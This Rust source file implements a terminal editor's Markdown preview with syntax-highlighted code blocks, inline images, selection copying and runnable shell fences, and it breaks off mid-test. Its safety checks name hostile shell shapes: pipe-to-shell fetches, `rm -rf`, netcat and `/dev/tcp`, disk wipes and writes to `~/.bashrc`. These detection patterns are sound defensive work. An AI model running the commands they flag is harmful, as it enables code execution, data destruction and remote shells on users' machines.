//! Rendered Markdown preview (Cmd/Ctrl+Shift+V): a pure converter from
//! CommonMark text to styled ratatui lines, consumed by the editor's preview
//! view. pulldown-cmark (rustdoc / mdBook's engine) drives the event stream;
//! fenced code blocks route through the same tree-sitter highlighter the
//! editor uses, so a ```rust block in the preview colours exactly like the
//! file would. Paragraph text is emitted unwrapped — the editor renders the
//! lines through a wrapping `Paragraph`, so the preview reflows with the pane.

use pulldown_cmark::{CodeBlockKind, Event, HeadingLevel, Options, Parser, Tag, TagEnd};
use ratatui::style::{Color, Modifier, Style};
use ratatui::text::{Line, Span};

use crate::highlight::{
    HiSpan, LangKind, LangRegistry, compute_line_starts, highlight_text, lang_for_extension,
};
use crate::theme::Theme;

const FG: Color = Color::Rgb(0xC0, 0xC5, 0xCE);
const DIM: Color = Color::Rgb(0x60, 0x68, 0x78);
const CODE: Color = Color::Rgb(0xD0, 0x87, 0x70);
const RULE_COLS: usize = 60;

/// The editor-held preview state: the built lines, the vertical scroll, and
/// the edit seq the lines were built from (a stale seq rebuilds lazily on the
/// next render, so the preview follows external reloads and live edits).
pub struct MarkdownPreview {
    pub lines: Vec<Line<'static>>,
    pub scroll: u16,
    pub built_seq: u64,
    /// Local images resolved at build (#176): each owns a run of blank
    /// reserved lines in `lines` that the app's overlay paints into.
    pub images: Vec<MdImage>,
    /// Frame truth, written by the editor's render: each image's anchor
    /// as a VISUAL row in the wrapped paragraph (same order as
    /// `images`), the (built_seq, wrap width) the mapping was computed
    /// for, and the text area the paragraph painted into.
    pub anchor_rows: Vec<usize>,
    pub wrap_key: (u64, u16),
    pub last_area: ratatui::layout::Rect,
    /// True when this preview renders a Jupyter notebook (#180): the
    /// stale-rebuild and theme-switch paths dispatch to the notebook
    /// builder instead of the markdown one.
    pub notebook: bool,
    /// Frame truth, written by the editor's render: one entry per painted
    /// visual row of `last_area`, each holding that row's cell symbols by
    /// SCREEN COLUMN. Per-column (not a joined string) keeps wide glyphs
    /// aligned: a double-width character owns its column and leaves an
    /// empty continuation cell, so a column index always addresses the
    /// right character. The rendered view is a wrapped `Paragraph`, so
    /// these cells are the only faithful record of what the user sees.
    pub rows: Vec<Vec<String>>,
    /// The user's selection over the rendered view, as (row, col) pairs
    /// relative to `last_area`: `anchor` is where the drag started,
    /// `head` where it is now. `None` when nothing is selected.
    pub selection: Option<((u16, u16), (u16, u16))>,
    /// True while a mouse drag is extending `selection`.
    pub dragging: bool,
    /// Runnable fences (#353) and, frame truth like `anchor_rows`, each
    /// one's glyph line as a VISUAL row (same order, same `wrap_key`).
    pub runnables: Vec<MdRunnable>,
    pub run_rows: Vec<usize>,
    /// Set when this preview renders a docx/odt document (#181): the
    /// rebuild paths re-walk THIS file instead of the text buffer.
    pub doc_path: Option<std::path::PathBuf>,
    /// True when `doc_path` names a MEDIA file (#183): the rebuild
    /// dispatch probes headers instead of walking document XML.
    pub media: bool,
}

/// One runnable fenced block in a rendered preview (#353): a shell (or,
/// when the interpreter is on PATH, python/node) fence wearing a play
/// glyph on its first line. Clicking the glyph types the block into a
/// pane named after the document and block number.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct MdRunnable {
    /// Index of the block's first rendered line (the one with the glyph).
    pub first_line: usize,
    /// The fence's SOURCE lines, `[start, end)`, opener and closer
    /// included: what `Cmd+Enter` uses to find the block under the caret,
    /// from the parser's own offsets rather than a second fence scanner.
    pub lines: (usize, usize),
    /// The block's text, as written.
    pub code: String,
    /// The interpreter: `sh` (typed at the shell as-is), `python3` or `node`
    /// (fed through a heredoc).
    pub interpreter: &'static str,
    /// The block looks destructive (`rm -rf`, `sudo`, `curl … | sh`, a
    /// redirect, …) or the fence said `{confirm}`: the confirm popup says
    /// so in red. Every block confirms; this only changes the wording.
    pub destructive: bool,
    /// `{cwd=root}` runs in the workspace root instead of the document's
    /// directory. The only `cwd=` value honoured.
    pub cwd_root: bool,
}

/// The play glyph a runnable fence wears in place of its first bar.
pub const RUN_GLYPH: &str = "\u{25b7} ";

/// Interpreter for a fence info string, or None when the block is not
/// runnable: not a shell/python/node fence, `{run=false}`, or an
/// interpreter that is not installed (looked up once per process).
pub fn runnable_interpreter(info: &str) -> Option<&'static str> {
    let (lang, attrs) = split_info(info);
    if attrs.iter().any(|a| *a == "run=false" || *a == "run=no") {
        return None;
    }
    match lang.to_ascii_lowercase().as_str() {
        "sh" | "bash" | "zsh" | "fish" | "shell" | "console" => Some("sh"),
        "python" | "py" | "python3" => interpreter_on_path("python3").then_some("python3"),
        "node" | "javascript" | "js" => interpreter_on_path("node").then_some("node"),
        _ => None,
    }
}

/// The fence's language word and its `{a=b c}` attributes.
pub(crate) fn split_info(info: &str) -> (&str, Vec<&str>) {
    let info = info.trim();
    let (lang, rest) = match info.find('{') {
        Some(i) => (&info[..i], &info[i..]),
        None => (info, ""),
    };
    let lang = lang.split_whitespace().next().unwrap_or("");
    let attrs = rest
        .trim_start_matches('{')
        .trim_end_matches('}')
        .split(|c: char| c.is_whitespace() || c == ',')
        .filter(|a| !a.is_empty())
        .collect();
    (lang, attrs)
}

fn interpreter_on_path(name: &str) -> bool {
    // Looked up once per process: the preview rebuilds on every edit, and
    // a PATH walk per python fence per keystroke is a syscall burst.
    static PYTHON3: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
    static NODE: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
    let probe = || {
        std::env::var_os("PATH")
            .is_some_and(|path| std::env::split_paths(&path).any(|d| d.join(name).is_file()))
    };
    match name {
        "python3" => *PYTHON3.get_or_init(probe),
        "node" => *NODE.get_or_init(probe),
        _ => probe(),
    }
}

/// A block that carries a control character other than newline or tab is
/// never runnable: a `\r` makes the typed bytes a different program from
/// the rendered line, and an escape sequence can repaint the popup.
pub fn has_control_chars(code: &str) -> bool {
    code.chars().any(|c| {
        (c.is_control() && c != '\n' && c != '\t')
            // Format characters (Unicode Cf) are not `is_control` but do the
            // same damage: a bidi override reorders the displayed line
            // without changing the bytes (Trojan Source), a zero-width
            // character hides a split inside a word.
            || matches!(
                c,
                '\u{200B}'..='\u{200F}'
                    | '\u{202A}'..='\u{202E}'
                    | '\u{2060}'..='\u{2064}'
                    | '\u{2066}'..='\u{2069}'
                    | '\u{FEFF}'
                    | '\u{00AD}'
            )
    })
}

/// A small built-in matcher for the shapes that delete, escalate, pipe
/// the network into a shell, exfiltrate, or write outside the block's own
/// output (#353). It cannot be complete - README text is attacker-authored
/// - which is why every block confirms; a hit only turns the popup red.
pub fn looks_destructive(code: &str) -> bool {
    let c = code.to_ascii_lowercase();
    let fetches = |l: &str| l.contains("curl") || l.contains("wget");
    // The redirect scan reads the whole block: a string can span lines,
    // and its closing line on its own looks like a comment.
    has_write_redirect(&c)
        || c.lines().any(|l| {
            let l = l.trim();
            // `curl … | sh`, `wget … |bash`, `… | sudo …`
            let piped_to_shell = fetches(l)
                && l.split('|').skip(1).any(|part| {
                    let p = part.trim_start();
                    [
                        "sh", "bash", "zsh", "fish", "sudo", "python", "perl", "ruby", "node",
                    ]
                    .iter()
                    .any(|w| {
                        p == *w
                            || p.starts_with(&format!("{w} "))
                            || p.starts_with(&format!("{w}\t"))
                    })
                });
            // `sh -c "$(curl …)"`, `eval "$(wget …)"`, backticks
            let substituted_fetch = fetches(l)
                && (l.contains("$(") || l.contains('`'))
                && (l.contains("eval")
                    || l.contains(" -c ")
                    || l.starts_with("sh ")
                    || l.starts_with("bash "));
            // `rm -rf`, `rm -r -f`, `\rm -fr …`: an rm with both r and f flags
            let rm_rf = l
                .split_whitespace()
                .next()
                .is_some_and(|w| w.trim_start_matches('\\') == "rm")
                && l.split_whitespace()
                    .skip(1)
                    .any(|f| f.starts_with('-') && f.contains('r'))
                && l.split_whitespace()
                    .skip(1)
                    .any(|f| f.starts_with('-') && f.contains('f'));
            piped_to_shell
                || substituted_fetch
                || rm_rf
                || l.starts_with("sudo ")
                || l.contains(" sudo ")
                || l.contains("mkfs")
                || l.contains("dd if=")
                || l.contains("--force")
                || l.contains("git reset --hard")
                || l.contains("drop table")
                || l.starts_with("nc ")
                || l.contains(" nc ")
                || l.contains("ncat ")
                || l.contains("/dev/tcp")
                || l.starts_with("chmod ")
                || l.starts_with("chown ")
                || l.contains(" chmod ")
                || l.contains(" chown ")
        })
}

/// A `>` anywhere in the block that writes somewhere: not `2>&1` / `>&2`
/// (a descriptor dup),
/// not `>/dev/null` (the device itself, not `/dev/nullish`), not an arrow
/// (`->`, `=>`), not in a trailing comment. Quotes are honoured, so a `#`
/// or `>` inside `"…"` / `'…'` is text - otherwise
/// `echo "step #1" > ~/.bashrc` would hide its redirect behind a fake
/// comment. A backslash escapes the next byte outside quotes and inside
/// double quotes (`echo \" > ~/.bashrc` really writes the file). A quote
/// that never closes (`echo don't > ~/.bashrc`) fails OPEN: the block is
/// rescanned with quotes as plain text, since a missed write costs more
/// than a spurious red banner. Quotes span lines, so the closing line of
/// `echo "hello\nworld # note" > /tmp/x` is a redirect, not a comment.
/// `<>` counts: it opens its target for writing too.
fn has_write_redirect(code: &str) -> bool {
    match redirect_scan(code, true) {
        RedirectScan::Found => true,
        RedirectScan::Clean => false,
        RedirectScan::Unterminated => redirect_scan(code, false) == RedirectScan::Found,
    }
}

#[derive(PartialEq, Eq)]
enum RedirectScan {
    Found,
    Clean,
    /// The block ended inside a quote, so nothing after the opening quote
    /// was looked at.
    Unterminated,
}

/// One pass of [`has_write_redirect`] over a whole block; `quotes` says
/// whether `'` and `"` open a string or are ordinary bytes.
fn redirect_scan(code: &str, quotes: bool) -> RedirectScan {
    let line = code;
    let b = line.as_bytes();
    let mut quote: Option<u8> = None;
    let mut i = 0;
    while i < b.len() {
        let c = b[i];
        match quote {
            Some(q) if c == q => quote = None,
            Some(b'"') if c == b'\\' => i += 1,
            Some(_) => {}
            None => match c {
                b'\\' => i += 1,
                b'\'' | b'"' if quotes => quote = Some(c),
                // A `#` starts a comment only when quotes are being
                // honoured: the quote-blind rescan runs because a string
                // was left open, and a `#` inside that string is text.
                b'#' if quotes && (i == 0 || b[i - 1].is_ascii_whitespace()) => {
                    // A comment runs to the end of its line; the block goes on.
                    while i < b.len() && b[i] != b'\n' {
                        i += 1;
                    }
                    continue;
                }
                b'>' => {
                    let prev = if i > 0 { b[i - 1] } else { b' ' };
                    if prev != b'-' && prev != b'=' {
                        let mut j = i + 1;
                        while j < b.len() && b[j] == b'>' {
                            j += 1;
                        }
                        while j < b.len() && b[j].is_ascii_whitespace() {
                            j += 1;
                        }
                        let target = &line[j..];
                        let dev_null = target.strip_prefix("/dev/null").is_some_and(|rest| {
                            rest.is_empty()
                                || rest.starts_with(|r: char| {
                                    r.is_ascii_whitespace() || ";&|)".contains(r)
                                })
                        });
                        if !(target.starts_with('&') || dev_null) {
                            return RedirectScan::Found;
                        }
                    }
                }
                _ => {}
            },
        }
        i += 1;
    }
    if quote.is_some() {
        RedirectScan::Unterminated
    } else {
        RedirectScan::Clean
    }
}

/// One local image block in a rendered preview (#176).
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct MdImage {
    /// Index of the first reserved (blank) line in the built lines.
    pub first_line: usize,
    /// Reserved line count, from the image's aspect at build time.
    pub rows: u16,
    pub path: std::path::PathBuf,
}

/// Map a fenced code block's info string to a highlighter language. Accepts
/// the common fence names and falls back to the file-extension table.
fn lang_for_fence(info: &str) -> Option<LangKind> {
    let tag = info.split_whitespace().next().unwrap_or("");
    Some(match tag.to_ascii_lowercase().as_str() {
        "rust" => LangKind::Rust,
        "python" => LangKind::Python,
        "javascript" => LangKind::JavaScript,
        "typescript" => LangKind::TypeScript,
        "golang" => LangKind::Go,
        "shell" | "console" | "terminal" => LangKind::Bash,
        other => return lang_for_extension(other),
    })
}

/// Convert one highlighted source line into owned spans, filling unstyled
/// gaps with `code_fg` — the theme's code foreground, never the Base16
/// literal, so gaps match the captured tokens around them on every theme.
fn code_line_spans(line: &str, spans: &[HiSpan], code_fg: Color) -> Vec<Span<'static>> {
    let mut out = Vec::new();
    let mut cursor = 0usize;
    for sp in spans {
        let start = sp.start.min(line.len());
        let end = sp.end.min(line.len());
        if start > cursor {
            out.push(Span::styled(
                line[cursor..start].to_string(),
                Style::default().fg(code_fg),
            ));
        }
        if end > start {
            out.push(Span::styled(line[start..end].to_string(), sp.style));
        }
        cursor = cursor.max(end);
    }
    if cursor < line.len() {
        out.push(Span::styled(
            line[cursor..].to_string(),
            Style::default().fg(code_fg),
        ));
    }
    out
}

struct Renderer<'r> {
    theme: Theme,
    registry: &'r mut LangRegistry,
    out: Vec<Line<'static>>,
    cur: Vec<Span<'static>>,
    bold: u32,
    italic: u32,
    strike: u32,
    link: u32,
    heading: Option<HeadingLevel>,
    /// Ordered-list counters (`Some(next)`) or bullets (`None`), by depth.
    list_stack: Vec<Option<u64>>,
    quote_depth: usize,
    /// Set at `Item` start, emitted before the item's first content so a
    /// task-list marker can replace the plain bullet.
    pending_marker: Option<String>,
    /// Fence language + accumulated block text while inside a code block.
    code_block: Option<(Option<LangKind>, String)>,
    /// The open fence's info string and SOURCE line range, for the
    /// runnable check (#353).
    code_info: String,
    code_lines: (usize, usize),
    runnables: Vec<MdRunnable>,
    /// Rows of cell texts while inside a table (row 0 is the header).
    table: Option<Vec<Vec<String>>>,
    /// Directory local image paths resolve against (#176); None keeps
    /// every image a placeholder.
    base_dir: Option<std::path::PathBuf>,
    images: Vec<MdImage>,
    /// Set while inside a RESERVED image's tag pair: pulldown-cmark
    /// emits the alt content between Tag::Image and TagEnd::Image, and
    /// letting it through painted the alt text after the reserved rows
    /// (#196 review). Placeholder images keep their alt.
    suppress_inline: bool,
}

impl Renderer<'_> {
    fn inline_style(&self) -> Style {
        let mut style = Style::default().fg(self.theme.ui(FG));
        if let Some(level) = self.heading {
            style = style.add_modifier(Modifier::BOLD);
            style = match level {
                HeadingLevel::H1 => style
                    .fg(self.theme.accent())
                    .add_modifier(Modifier::UNDERLINED),
                HeadingLevel::H2 => style.fg(self.theme.accent()),
                HeadingLevel::H3 => style.fg(self.theme.ui(FG)),
                _ => style.fg(self.theme.ui(DIM)),
            };
        }
        if self.bold > 0 {
            style = style.add_modifier(Modifier::BOLD);
        }
        if self.italic > 0 {
            style = style.add_modifier(Modifier::ITALIC);
        }
        if self.strike > 0 {
            style = style.add_modifier(Modifier::CROSSED_OUT);
        }
        if self.link > 0 {
            style = style
                .fg(self.theme.accent())
                .add_modifier(Modifier::UNDERLINED);
        }
        if self.quote_depth > 0 {
            style = style.fg(self.theme.ui(DIM)).add_modifier(Modifier::ITALIC);
        }
        style
    }

    /// The block prefix a fresh content line carries: quote bars, then list
    /// indentation, then a pending item marker.
    fn begin_content(&mut self) {
        if !self.cur.is_empty() {
            return;
        }
        for _ in 0..self.quote_depth {
            self.cur.push(Span::styled(
                "\u{258e} ",
                Style::default().fg(self.theme.ui(DIM)),
            ));
        }
        if !self.list_stack.is_empty() {
            let depth = self.list_stack.len() - 1;
            self.cur.push(Span::raw("  ".repeat(depth)));
        }
        if let Some(marker) = self.pending_marker.take() {
            self.cur.push(Span::styled(
                marker,
                Style::default().fg(self.theme.accent()),
            ));
        } else if !self.list_stack.is_empty() {
            // A wrapped/continued line inside an item hangs under its text.
            self.cur.push(Span::raw("  "));
        }
    }

    fn push_text(&mut self, text: &str, style: Style) {
        self.begin_content();
        self.cur.push(Span::styled(text.to_string(), style));
    }

    fn flush_line(&mut self) {
        if self.cur.is_empty() {
            return;
        }
        let spans = std::mem::take(&mut self.cur);
        self.out.push(Line::from(spans));
    }

    fn ensure_blank(&mut self) {
        self.flush_line();
        if self.out.last().is_some_and(|l| !l.spans.is_empty()) {
            self.out.push(Line::default());
        }
    }

    fn end_code_block(&mut self) {
        let Some((kind, text)) = self.code_block.take() else {
            return;
        };
        let info = std::mem::take(&mut self.code_info);
        let runnable = runnable_interpreter(&info)
            .filter(|_| !has_control_chars(&text) && !text.trim().is_empty())
            .map(|interpreter| {
                let (_, attrs) = split_info(&info);
                MdRunnable {
                    first_line: self.out.len(),
                    lines: self.code_lines,
                    code: text.clone(),
                    interpreter,
                    destructive: attrs.contains(&"confirm") || looks_destructive(&text),
                    cwd_root: attrs.contains(&"cwd=root"),
                }
            });
        let bar = Span::styled("\u{258e} ", Style::default().fg(self.theme.accent()));
        // The play glyph replaces the first line's bar (#353): the same
        // width, so the block's text keeps its column.
        let play = Span::styled(
            RUN_GLYPH,
            Style::default()
                .fg(self.theme.accent())
                .add_modifier(Modifier::BOLD),
        );
        let (fr, fg_, fb) = self.theme.syntax().fg;
        let code_fg = Color::Rgb(fr, fg_, fb);
        let highlighted = kind.map(|k| {
            let bytes = text.as_bytes();
            let line_starts = compute_line_starts(bytes);
            highlight_text(self.registry, k, bytes, &line_starts)
        });
        for (i, line) in text.lines().enumerate() {
            let mut spans = vec![if i == 0 && runnable.is_some() {
                play.clone()
            } else {
                bar.clone()
            }];
            match highlighted.as_ref().and_then(|h| h.get(i)) {
                Some(hi) if !hi.is_empty() => spans.extend(code_line_spans(line, hi, code_fg)),
                _ => spans.push(Span::styled(line.to_string(), Style::default().fg(code_fg))),
            }
            self.out.push(Line::from(spans));
        }
        if let Some(r) = runnable {
            self.runnables.push(r);
        }
        self.out.push(Line::default());
    }

    fn end_table(&mut self) {
        let Some(rows) = self.table.take() else {
            return;
        };
        if rows.is_empty() {
            return;
        }
        let cols = rows.iter().map(Vec::len).max().unwrap_or(0);
        let mut widths = vec![0usize; cols];
        for row in &rows {
            for (i, cell) in row.iter().enumerate() {
                widths[i] = widths[i].max(cell.chars().count());
            }
        }
        for (r, row) in rows.iter().enumerate() {
            let mut spans: Vec<Span<'static>> = Vec::new();
            let style = if r == 0 {
                Style::default()
                    .fg(self.theme.ui(FG))
                    .add_modifier(Modifier::BOLD)
            } else {
                Style::default().fg(self.theme.ui(FG))
            };
            for (i, width) in widths.iter().enumerate() {
                if i > 0 {
                    spans.push(Span::styled(
                        " \u{2502} ",
                        Style::default().fg(self.theme.ui(DIM)),
                    ));
                }
                let cell = row.get(i).map(String::as_str).unwrap_or("");
                let pad = width.saturating_sub(cell.chars().count());
                spans.push(Span::styled(format!("{cell}{}", " ".repeat(pad)), style));
            }
            self.out.push(Line::from(spans));
            if r == 0 {
                // Header separator: ─ runs joined by ┼ at each column seam.
                let mut sep: Vec<Span<'static>> = Vec::new();
                for (i, width) in widths.iter().enumerate() {
                    if i > 0 {
                        sep.push(Span::styled(
                            "\u{2500}\u{253c}\u{2500}",
                            Style::default().fg(self.theme.ui(DIM)),
                        ));
                    }
                    sep.push(Span::styled(
                        "\u{2500}".repeat(*width),
                        Style::default().fg(self.theme.ui(DIM)),
                    ));
                }
                self.out.push(Line::from(sep));
            }
        }
        self.out.push(Line::default());
    }
}

/// Render markdown `text` into styled preview lines.
/// Image-less build: used by tests and any caller with no source
/// directory to resolve pictures against.
#[cfg_attr(not(test), allow(dead_code))]
pub fn render_markdown(
    text: &str,
    theme: Theme,
    registry: &mut LangRegistry,
) -> Vec<Line<'static>> {
    render_markdown_with_images(text, theme, registry, None).0
}

/// Like [`render_markdown`], resolving local images against `base_dir`
/// into reserved blocks (#176).
pub fn render_markdown_with_images(
    text: &str,
    theme: Theme,
    registry: &mut LangRegistry,
    base_dir: Option<&std::path::Path>,
) -> (Vec<Line<'static>>, Vec<MdImage>) {
    let (lines, images, _) = render_markdown_full(text, theme, registry, base_dir);
    (lines, images)
}

/// [`render_markdown_with_images`] plus the runnable fences (#353).
pub fn render_markdown_full(
    text: &str,
    theme: Theme,
    registry: &mut LangRegistry,
    base_dir: Option<&std::path::Path>,
) -> (Vec<Line<'static>>, Vec<MdImage>, Vec<MdRunnable>) {
    let options =
        Options::ENABLE_TABLES | Options::ENABLE_STRIKETHROUGH | Options::ENABLE_TASKLISTS;
    let mut r = Renderer {
        theme,
        registry,
        out: Vec::new(),
        cur: Vec::new(),
        bold: 0,
        italic: 0,
        strike: 0,
        link: 0,
        heading: None,
        list_stack: Vec::new(),
        quote_depth: 0,
        pending_marker: None,
        code_block: None,
        code_info: String::new(),
        code_lines: (0, 0),
        runnables: Vec::new(),
        table: None,
        base_dir: base_dir.map(|p| p.to_path_buf()),
        images: Vec::new(),
        suppress_inline: false,
    };
    // Byte offset -> line, for the runnable fences' source ranges (#353).
    let line_starts: Vec<usize> = std::iter::once(0)
        .chain(text.match_indices('\n').map(|(i, _)| i + 1))
        .collect();
    let line_of = |offset: usize| {
        line_starts
            .partition_point(|&s| s <= offset)
            .saturating_sub(1)
    };
    for (event, range) in Parser::new_ext(text, options).into_offset_iter() {
        match event {
            Event::Start(tag) => match tag {
                Tag::Heading { level, .. } => {
                    r.ensure_blank();
                    r.heading = Some(level);
                }
                Tag::Paragraph if r.list_stack.is_empty() && r.quote_depth == 0 => {
                    r.ensure_blank();
                }
                Tag::CodeBlock(kind) => {
                    r.ensure_blank();
                    let lang = match &kind {
                        CodeBlockKind::Fenced(info) => lang_for_fence(info),
                        CodeBlockKind::Indented => None,
                    };
                    r.code_info = match &kind {
                        CodeBlockKind::Fenced(info) => info.to_string(),
                        CodeBlockKind::Indented => String::new(),
                    };
                    // The Start event's range spans the whole block, closer
                    // included.
                    r.code_lines = (
                        line_of(range.start),
                        line_of(range.end.saturating_sub(1)) + 1,
                    );
                    r.code_block = Some((lang, String::new()));
                }
                Tag::List(start) => {
                    if r.list_stack.is_empty() {
                        r.ensure_blank();
                    } else {
                        r.flush_line();
                    }
                    r.list_stack.push(start);
                }
                Tag::Item => {
                    r.flush_line();
                    let marker = match r.list_stack.last_mut() {
                        Some(Some(n)) => {
                            let m = format!("{n}. ");
                            *n += 1;
                            m
                        }
                        _ => "\u{2022} ".to_string(),
                    };
                    r.pending_marker = Some(marker);
                }
                Tag::BlockQuote(_) => {
                    r.ensure_blank();
                    r.quote_depth += 1;
                }
                Tag::Emphasis => r.italic += 1,
                Tag::Strong => r.bold += 1,
                Tag::Strikethrough => r.strike += 1,
                Tag::Link { .. } => r.link += 1,
                Tag::Image { dest_url, .. } => {
                    // Local, existing, decodable images reserve blank
                    // lines the app's inline-image overlay paints into
                    // (#176). Remote URLs and misses keep the labelled
                    // placeholder - the preview never fetches.
                    let local = (!dest_url.contains("://"))
                        .then(|| r.base_dir.as_ref().map(|d| d.join(dest_url.as_ref())))
                        .flatten()
                        .filter(|p| p.is_file());
                    let dims = local.as_ref().and_then(|p| image::image_dimensions(p).ok());
                    if let (Some(path), Some((px_w, px_h))) = (local, dims) {
                        r.ensure_blank();
                        // Cells are roughly twice as tall as wide; the
                        // preview column is ~72 cells. Clamped so a tall
                        // banner cannot swallow the viewport.
                        let rows = ((px_h as f32 / px_w.max(1) as f32) * 72.0 / 2.0)
                            .round()
                            .clamp(3.0, 18.0) as u16;
                        let first_line = r.out.len();
                        for _ in 0..rows {
                            r.out.push(Line::default());
                        }
                        r.images.push(MdImage {
                            first_line,
                            rows,
                            path,
                        });
                        r.suppress_inline = true;
                    } else {
                        r.begin_content();
                        let style = Style::default()
                            .fg(theme.ui(DIM))
                            .add_modifier(Modifier::ITALIC);
                        r.cur.push(Span::styled("\u{f03e} ", style));
                        r.cur.push(Span::styled(format!("({dest_url}) "), style));
                    }
                }
                Tag::Table(_) => {
                    r.ensure_blank();
                    r.table = Some(Vec::new());
                }
                Tag::TableHead => {
                    if let Some(rows) = r.table.as_mut() {
                        rows.push(Vec::new());
                    }
                }
                Tag::TableRow => {
                    if let Some(rows) = r.table.as_mut() {
                        rows.push(Vec::new());
                    }
                }
                Tag::TableCell => {
                    if let Some(rows) = r.table.as_mut()
                        && let Some(row) = rows.last_mut()
                    {
                        row.push(String::new());
                    }
                }
                _ => {}
            },
            Event::End(tag) => match tag {
                TagEnd::Heading(_) => {
                    r.flush_line();
                    r.heading = None;
                    r.out.push(Line::default());
                }
                TagEnd::Paragraph => {
                    r.flush_line();
                    if r.list_stack.is_empty() && r.quote_depth == 0 {
                        r.out.push(Line::default());
                    }
                }
                TagEnd::CodeBlock => r.end_code_block(),
                TagEnd::List(_) => {
                    r.flush_line();
                    r.list_stack.pop();
                    if r.list_stack.is_empty() {
                        r.out.push(Line::default());
                    }
                }
                TagEnd::Item => r.flush_line(),
                TagEnd::BlockQuote(_) => {
                    r.flush_line();
                    r.quote_depth = r.quote_depth.saturating_sub(1);
                    if r.quote_depth == 0 {
                        r.out.push(Line::default());
                    }
                }
                TagEnd::Emphasis => r.italic = r.italic.saturating_sub(1),
                TagEnd::Strong => r.bold = r.bold.saturating_sub(1),
                TagEnd::Strikethrough => r.strike = r.strike.saturating_sub(1),
                TagEnd::Link => r.link = r.link.saturating_sub(1),
                TagEnd::Image => r.suppress_inline = false,
                TagEnd::Table => r.end_table(),
                _ => {}
            },
            Event::Text(text) => {
                if r.suppress_inline {
                } else if let Some((_, buf)) = r.code_block.as_mut() {
                    buf.push_str(&text);
                } else if let Some(rows) = r.table.as_mut() {
                    if let Some(cell) = rows.last_mut().and_then(|row| row.last_mut()) {
                        cell.push_str(&text);
                    }
                } else {
                    let style = r.inline_style();
                    r.push_text(&text, style);
                }
            }
            Event::Code(code) => {
                if r.suppress_inline {
                } else if let Some(rows) = r.table.as_mut() {
                    if let Some(cell) = rows.last_mut().and_then(|row| row.last_mut()) {
                        cell.push_str(&code);
                    }
                } else {
                    r.begin_content();
                    r.cur.push(Span::styled(
                        code.to_string(),
                        Style::default().fg(theme.ui(CODE)),
                    ));
                }
            }
            Event::SoftBreak => {
                if !r.suppress_inline {
                    let style = r.inline_style();
                    r.push_text(" ", style);
                }
            }
            Event::HardBreak => {
                if !r.suppress_inline {
                    r.flush_line();
                }
            }
            Event::Rule => {
                r.ensure_blank();
                r.out.push(Line::from(Span::styled(
                    "\u{2500}".repeat(RULE_COLS),
                    Style::default().fg(theme.ui(DIM)),
                )));
                r.out.push(Line::default());
            }
            Event::TaskListMarker(checked) => {
                r.pending_marker = Some(if checked {
                    "\u{2611} ".to_string()
                } else {
                    "\u{2610} ".to_string()
                });
            }
            _ => {}
        }
    }
    r.flush_line();
    // Trim the leading/trailing blank separators so the preview starts at
    // the first real line - shifting the image anchors with the front
    // trim, and never eating a trailing image's RESERVED blanks.
    let reserved_end = r
        .images
        .iter()
        .map(|i| i.first_line + i.rows as usize)
        .max()
        .unwrap_or(0);
    let mut removed_front = 0usize;
    while r.out.first().is_some_and(|l| l.spans.is_empty())
        && r.images
            .first()
            .is_none_or(|i| removed_front < i.first_line)
    {
        r.out.remove(0);
        removed_front += 1;
    }
    for img in &mut r.images {
        img.first_line -= removed_front;
    }
    while r.out.len() > reserved_end.saturating_sub(removed_front)
        && r.out.last().is_some_and(|l| l.spans.is_empty())
    {
        r.out.pop();
    }
    (r.out, r.images, r.runnables)
}

impl MarkdownPreview {
    /// The selection normalised to (start, end) in reading order.
    fn ordered_selection(&self) -> Option<((u16, u16), (u16, u16))> {
        let (a, b) = self.selection?;
        // A click anchors head == anchor: that is a caret, not a
        // selection. Treating it as one would tint a stray cell and let a
        // plain click copy a character nobody selected.
        if a == b {
            return None;
        }
        Some(if (a.0, a.1) <= (b.0, b.1) {
            (a, b)
        } else {
            (b, a)
        })
    }

    /// True when cell (row, col) of the rendered view is selected. The
    /// render pass paints these cells with the selection background.
    pub fn cell_selected(&self, row: u16, col: u16) -> bool {
        let Some((start, end)) = self.ordered_selection() else {
            return false;
        };
        if row < start.0 || row > end.0 {
            return false;
        }
        let from = if row == start.0 { start.1 } else { 0 };
        let to = if row == end.0 { end.1 } else { u16::MAX };
        col >= from && col <= to
    }

    /// The selected text of the rendered view, extracted from the rows the
    /// last render recorded. Rows join with newlines, exactly as they read
    /// on screen (VS Code copies the rendered text, not the source).
    pub fn selection_text(&self) -> String {
        let Some((start, end)) = self.ordered_selection() else {
            return String::new();
        };
        let mut out: Vec<String> = Vec::new();
        for row in start.0..=end.0 {
            let Some(cells) = self.rows.get(row as usize) else {
                continue;
            };
            let from = if row == start.0 {
                (start.1 as usize).min(cells.len())
            } else {
                0
            };
            let to = if row == end.0 {
                ((end.1 as usize) + 1).min(cells.len())
            } else {
                cells.len()
            };
            // Column-indexed: a wide glyph's continuation cell is empty and
            // contributes nothing, so copied text keeps characters whole
            // however the row is sliced.
            out.push(if from <= to {
                cells[from..to].concat().trim_end().to_string()
            } else {
                String::new()
            });
        }
        // A single-row selection has no line break; multi-row keeps the
        // visual line structure, trailing padding already trimmed.
        out.join("\n").trim_end().to_string()
    }

    /// Whether anything is selected (drives the copy path and the
    /// "clear selection" gestures).
    pub fn has_selection(&self) -> bool {
        self.ordered_selection().is_some()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn render(text: &str) -> Vec<Line<'static>> {
        render_markdown(text, Theme::default(), &mut LangRegistry::new())
    }

    fn text_of(line: &Line) -> String {
        line.spans.iter().map(|s| s.content.as_ref()).collect()
    }

    #[test]
    fn local_images_reserve_anchored_rows_and_urls_stay_placeholders() {
        let tmp = tempfile::tempdir().unwrap();
        image::RgbaImage::new(100, 50)
            .save(tmp.path().join("pic.png"))
            .unwrap();
        let text = "# Title\n\n![local](pic.png)\n\n![remote](https://x/y.png)\n\n![gone](nope.png)\n\ntail";
        let mut reg = crate::highlight::LangRegistry::default();
        let (lines, images) =
            super::render_markdown_with_images(text, Theme::BLACK, &mut reg, Some(tmp.path()));
        assert_eq!(images.len(), 1, "only the local existing image reserves");
        let img = &images[0];
        assert!(img.path.ends_with("pic.png"));
        // 100x50 at the 72-col budget: (50/100)*72/2 = 18 rows.
        assert_eq!(img.rows, 18);
        for i in 0..img.rows as usize {
            assert!(
                lines[img.first_line + i].spans.is_empty(),
                "reserved line {i} must be blank"
            );
        }
        let all = all_text(&lines);
        assert!(all.contains("https://x/y.png"), "URL keeps the placeholder");
        assert!(
